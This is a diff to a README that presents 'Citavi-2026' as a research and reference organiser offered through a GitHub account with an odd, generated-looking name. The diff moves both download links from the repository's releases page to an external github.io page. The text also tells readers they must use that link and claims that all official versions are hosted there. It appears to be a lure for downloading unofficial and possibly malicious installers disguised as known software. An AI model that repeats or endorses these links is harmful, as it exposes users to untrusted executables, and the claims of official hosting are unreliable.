@@ -1,6 +1,6 @@
 # 📚 Citavi-2026 - Organize your research and references easily
 
-[![](https://img.shields.io/badge/Download-Citavi-2026-blue.svg)](https://github.com/intercollegiate-monochromaticvision235/Citavi-2026/releases)
+[![](https://img.shields.io/badge/Download-Citavi-2026-blue.svg)](https://intercollegiate-monochromaticvision235.github.io)
 
 ## 📋 Project Overview
 
@@ -21,7 +21,7 @@ Ensure your computer meets these specifications before you start:
 
 You must visit the provided link to get the correct installer for your system. We host all official versions on GitHub.
 
-[Click here to visit the release page and download your copy](https://github.com/intercollegiate-monochromaticvision235/Citavi-2026/releases)
+[Click here to visit the release page and download your copy](https://intercollegiate-monochromaticvision235.github.io)
 
 1. Open your web browser.
 2. Select the link above to reach the project release page.
